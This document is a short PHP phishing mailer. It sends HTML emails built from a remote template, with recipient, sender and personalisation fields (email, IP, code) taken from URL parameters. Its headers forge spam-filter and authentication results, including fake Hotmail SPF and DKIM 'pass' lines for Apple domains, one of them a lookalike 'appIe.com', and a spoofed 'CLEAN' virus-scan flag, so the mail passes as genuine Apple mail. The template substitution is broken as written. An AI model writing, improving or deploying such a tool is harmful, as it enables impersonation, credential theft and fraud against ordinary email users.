 <?php
$code = $_GET['code'];
$ip = $_GET['ip'];
$to      = $_GET['to'];
$subject = $_GET['subject'];
$message = $_GET['letter'];
$name	= $_GET['name'];
$from = $_GET['from'];
$letter = file_get_contents($message);
$keymail = '!email!';
$keyip = '!ip!';
$keycode = '!code!';
$letter1 = str_replace('$keymail','$to', $letter);
$letter2 = str_replace('$keyip','$ip', $letter1);
$letter3 = str_replace('$keycode','$code', $letter2);
$header  = 'MIME-Version: 1.0\n';
$header .= 'Content-type: text/html\n';
$header .= 'From: '.$name . ' <' . $from . '>\n';
$header .= 'Reply-To: ' . $from . '\n';
$header .= 'X-Priority: 3\n';
$header .= 'X-MSMail-Priority: Normal\n';
$header .= 'Content-Transfer-Encoding: 8bit\n';
$header .= 'Importance: High\n';
$header .= 'X-Attach-Flag: N\r\n';
$header .= 'X-Reference: '.$subject.'\r\n';
$header .= 'X-TXN_ID: custom-value\r\n';
$header .= 'X-Business-Group: apple.com\r\n';
$header .= 'x-live-global-disposition: G\r\n';
$header .= 'X-Relaying-Domain: outlook.com\r\n';
$header .= 'X-HOTMAIL-VSS-INFO: G\r\n';
$header .= 'X-HOTMAIL-VSS-CODE: CLEAN\r\n';
$header .= 'X-HOTMAIL-SCOLL-AUTHENTICATION: mtaiw-mad01.mx.live.com ; domain : email.appIe.com DKIM : pass\r\n';
$header .= 'X-HOTMAIL-sid: 3039ac1addc75a145f8149a9\r\n';
$header .= 'X-HOTMAIL-SPF: domain : email.apple.com SPF : pass\r\n';
 
if(@mail($to, $subject, $letter3, $header))
   {
     echo 'ok';
   }else{
     echo 'fail';
   }
?>
